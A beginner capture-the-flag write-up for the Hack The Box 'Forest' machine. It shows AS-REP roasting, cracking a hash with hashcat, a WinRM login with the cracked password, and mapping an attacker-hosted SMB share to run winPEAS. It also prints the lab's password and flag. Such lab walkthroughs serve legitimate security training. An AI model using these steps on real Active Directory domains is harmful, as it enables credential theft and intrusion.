---
description: https://app.hackthebox.com/machines/Forest
---

# 🤼 Forest

<figure><img src="../../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

I'm going to do this machine with the guided mode for beginner-friendly methodology →

**For which domain is this machine a Domain Controller?**

<figure><img src="../../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

**Answer:** htb.local

**Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM**

**Answer:** LDAP

**Explanation:** LDAP is often used to store directory information, such as user profiles, organizational structures, and other public information. Allowing anonymous access facilitates read-only access to this public information without requiring explicit authentication. For example, an organization might use LDAP to store contact information, and anonymous access allows users to search and retrieve this data without needing to authenticate.

In some cases, LDAP is used to provide a directory service where users can search for and retrieve information without the need for authentication. For instance, an LDAP directory might store information about printers, network devices, or other resources that users need to discover.

Anonymous access can simplify the setup process, especially for services that don't require strict access controls. For instance, if an application only needs to perform read operations on a public LDAP directory, allowing anonymous access can reduce the complexity of the authentication process.

**Which user has Kerberos Pre-Authentication disabled?**

```
GetNPUsers.py htb.local/ -dc-ip 10.129.208.8 -request -format hashcat
```

<figure><img src="../../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

**Answer:** svc-alfresco

**What is the password of the user svc-alfresco?**

First we put the hash in a file .txt

then we went on the command:

<figure><img src="../../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

<pre><code><strong>hashcat -m 18200 -a 0 hashsvc.txt /usr/share/wordlists/rockyou.txt 
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

**Answer:** s3rvice

**Submit the flag located on the svc-alfresco user's desktop.**

```
evil-winrm -i 10.129.208.8 -u svc-alfresco -p s3rvice
```

<figure><img src="../../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

**Answer:** d1a15ecc2dcb0510684f11979d183dfc

**Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the `@htb.local`**

while installing boodhound to map the domain, i encountered an error :

```
pip install bloodhound
```

<figure><img src="../../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

just type in this to fix error ->

```
pip install impacket==0.9.22
```

Just before that we will install winpeas ->

[https://github.com/carlospolop/PEASS-ng/releases/tag/20240303-ce06043c](https://github.com/carlospolop/PEASS-ng/releases/tag/20240303-ce06043c)

Make a directory called smb on your local machine, CD into it and out the winpeas in it.

then make a smb server locally&#x20;

```
impacket-smbserver Forest $(pwd) -smb2support -user felix -password felix
```

<figure><img src="../../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

* `impacket-smbserver`: This is the command to start the SMB server using the Impacket tool.
* `Forest`: This is the name of the SMB share you want to create. You can replace "Forest" with any name you prefer for your share.
* `$(pwd)`: This is a Unix/Linux command that expands the current working directory. It ensures that the SMB server is created in the current directory.
* `-smb2support`: This flag enables support for the SMB2 protocol, which is an improvement over the older SMB1 protocol.

Go back on the shell and create those variables:

```
$pass = convertto-securestring 'felix' -AsPlainText -Force
```

then&#x20;

```
$cred = New-Object System.Management.automation.PSCredential('felix', $pass)
```

final product should look like this:

<figure><img src="../../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>

1. `$pass = convertto-securestring 'felix' -AsPlainText -Force`: This line of code converts the plain text password 'felix' into a secure string using the `ConvertTo-SecureString` cmdlet. The `-AsPlainText` parameter ensures that the password is treated as plain text, and the `-Force` parameter confirms that you want to convert plain text into a secure string.
2. `$cred = New-Object System.Management.Automation.PSCredential('felix', $pass)`: This line of code creates a new credential object using the `New-Object` cmdlet. The credential object is created with the username 'felix' and the secure string password you created in the previous step. This object can be used for authentication purposes in various PowerShell cmdlets that require credentials. In summary, on a shell, you needed to create a secure string and a credential object to securely handle sensitive information, such as usernames and passwords, while adhering to security best practices.

Then for the final steps:

```
New-PSDrive -Name felix -PSProvider FileSystem -Credential $cred -Root \\10.10.14.79\Forest
```

This command creates a new PowerShell drive named "felix" using the `New-PSDrive` cmdlet. The drive is connected to a specific location using the `-Root` parameter and the FileSystem provider. Here's a breakdown of the command:

1. `-Name felix`: This parameter specifies the name of the new PowerShell drive, which is "felix" in this case.
2. `-PSProvider FileSystem`: This parameter sets the provider for the new drive to the FileSystem provider. The FileSystem provider is used to manage files and directories on a local or remote computer.
3. `-Credential $cred`: This parameter specifies the credential object `$cred` for authenticating access to the remote SMB share.
4. `-Root \\10.10.14.79\Forest`: This parameter sets the root path of the new drive to the remote SMB share "Forest" on the host "10.10.14.79". By creating this new drive, you can interact with the remote SMB share as if it were a local drive. This can be useful for various tasks, such as copying files, listing directories, and performing other file management operations.

Now if you did everything right the local smbserver looks like this:

<figure><img src="../../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

from your shell, to enter the share you need to:

<figure><img src="../../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

now you just need to execute the winPEAS file:

<figure><img src="../../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

set the winPEAS aside and open another shelll:

<figure><img src="../../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

Now do the same thing as earlier but change the name of the share:

<figure><img src="../../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>
